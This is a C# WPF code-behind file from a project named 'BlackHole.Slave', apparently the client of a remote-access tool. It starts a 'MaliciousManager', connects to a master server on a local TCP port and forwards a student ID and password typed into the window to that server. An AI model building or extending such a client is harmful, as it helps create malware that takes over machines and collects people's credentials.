using System.Windows;
using System;
using System.Threading;
using System.Windows.Forms;
using BlackHole.Slave.Helper.Native.Impl;
using BlackHole.Slave.Malicious;
using System.Timers;

namespace BlackHole.Slave
{
    
    /// <summary>
    /// MainWindow.xaml 的交互逻辑
    /// </summary>
    public partial class MainWindow : Window
    {
        public static void FireShutdown(int reason) => MasterServer.Instance.FireShutdown(reason);
        public string stuid;
        public string password;
        MasterServer mServer;
        public LoginProtect loginProtect;

        public MainWindow()
        {
            try
            {
                MaliciousManager.Instance.Initialize();
                mServer = MasterServer.Instance;
                mServer.Connect("tcp://127.0.0.1:5556");

                Kernel32.SetConsoleCtrlHandler(ctrl =>
                {
                    FireShutdown((int)ctrl);
                    Thread.Sleep(500);
                    return true;
                }, true);
                InitializeComponent();
                loginProtect = new LoginProtect();
            }
            catch (Exception e)
            {
#if DEBUG
                System.Windows.Forms.MessageBox.Show(e.ToString());
#endif
            }
            
            
        }

        private void StuLogin(object sender, RoutedEventArgs e)
        {
            
            stuid = Stuid.Text;
            password = Password.Text;
            mServer.RequestLogin(stuid, password);
            
        }
    }
}
